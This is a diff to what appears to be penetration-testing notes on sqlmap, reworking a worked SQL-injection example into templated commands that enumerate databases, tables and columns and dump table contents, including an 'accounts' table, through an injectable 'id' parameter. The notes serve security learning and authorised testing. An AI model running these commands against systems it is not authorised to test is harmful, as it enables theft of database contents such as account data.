@@ -109,13 +109,22 @@ If we needed authentication to access to the web we will need to add the cookies
 		- `--dump`: This parameter instructs sqlmap to extract the data from the specified table and display it as output.
 
 	- *Commands: *
-		- It shows the backend database is SQLite. 
+		- Find databases:
 		```bash
-		sqlmap -r pc -p id 
-		sqlmap -r pc -p id --dbs 
-		sqlmap -r pc -p id --tables  
-		sqlmap -r pc -p id -D SQLite_masterdb -T accounts --columns 
-		sqlmap -r pc -p id -D SQLite_masterdb -T accounts --batch --threads 5 --dump
+		sqlmap -r pc -p id  --dbs
+		```
+		- Find tables in a specific database:
+	
+		```bash
+		sqlmap -r pc -p id -D <database_name> --tables  
+		```
+		- Find columns in a specific table:
+		```bash
+		sqlmap -r pc -p id -D SQLite_masterdb -T <table_name> --columns 
+		```
+		- Dump columns content
+		```bash
+		sqlmap -r pc -p id -D <database_name> -T <table_name> --dump --columns "<column1_name>,<column2_name>,<column3_name>"
 		```
 - **Exemple 3**
 	- Parameters:
